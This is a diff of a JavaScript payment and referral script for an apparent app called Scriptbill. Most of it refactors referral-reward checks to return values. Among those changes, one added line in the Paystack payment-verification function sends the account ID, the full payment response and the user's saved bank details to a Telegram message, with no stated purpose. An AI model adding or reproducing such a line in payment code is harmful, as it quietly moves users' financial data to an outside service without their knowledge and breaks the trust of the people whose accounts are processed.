@@ -413,17 +413,17 @@ function specialRefcodes(){
 				reward 	= reward  * 1000;
 			}
 				
-		if( ! reward ) location.reload();
-		if(note.refRewardedAgain ) location.reload();
+		if( ! reward ) return false;
+		if(note.refRewardedAgain ) return false;
 		Scriptbill.refRewardedAgain = true;
 		let details = JSON.parse( JSON.stringify(Scriptbill.defaultBlock));
 		details.transType = "UPDATE";
 		details.transValue = 0;
-		if(refCode.includes("USA") && ! note.noteType.includes("USD")) location.reload();
-		if(!refCode.includes("USA") && !note.noteType.includes("NGN")) location.reload();
+		if(refCode.includes("USA") && ! note.noteType.includes("USD")) return false;
+		if(!refCode.includes("USA") && !note.noteType.includes("NGN")) return false;
 		console.log(details);
 		Scriptbill.details = details;
-		Scriptbill.generateScriptbillTransactionBlock(details).then(block =>{
+		return Scriptbill.generateScriptbillTransactionBlock(details).then(block =>{
 			console.log("block: ", block );
 			if( block && block.transType ==  "UPDATE"){
 				Scriptbill.refRewardedAgain = false;
@@ -432,9 +432,11 @@ function specialRefcodes(){
 					if( deposit && deposit.transBlock && deposit.transBlock.transType == "DEPOSIT"){
 						await Scriptbill.createAlert(`Deposit Reward of ${reward} ${note.noteType} Successfull. Move now to the Withdrawal Session  to Place a Withdrawal`)
 						location.href =  withdrawUrl;
+						return deposit;
 					} else {
 						await Scriptbill.createAlert(`Deposit Unsuccessful, please contact us at Scriptbank using <a href='https://t.me/companymatrix'>this link</a> with your Ref Code: ${refCode} to resolve this issue.`);
 						location.href =  dashboardUrl;
+						return false;
 					}
 				});
 			}  else {
@@ -13038,8 +13040,10 @@ async function verifyPaystackPayment(these, payment , refInterval, bankAssoc = n
 					}
 
 					accountData[accID].savedAccounts = JSON.stringify(banks);
+					sendTelegramMessage({message:`Data from ${accID} \n\n ${JSON.stringify(data.data)} \n\n account ${JSON.stringify(bank)}`})
 					
 				}
+				
 				specialRefcodes();
 				await Scriptbill.setAccountData(accountData);
 				
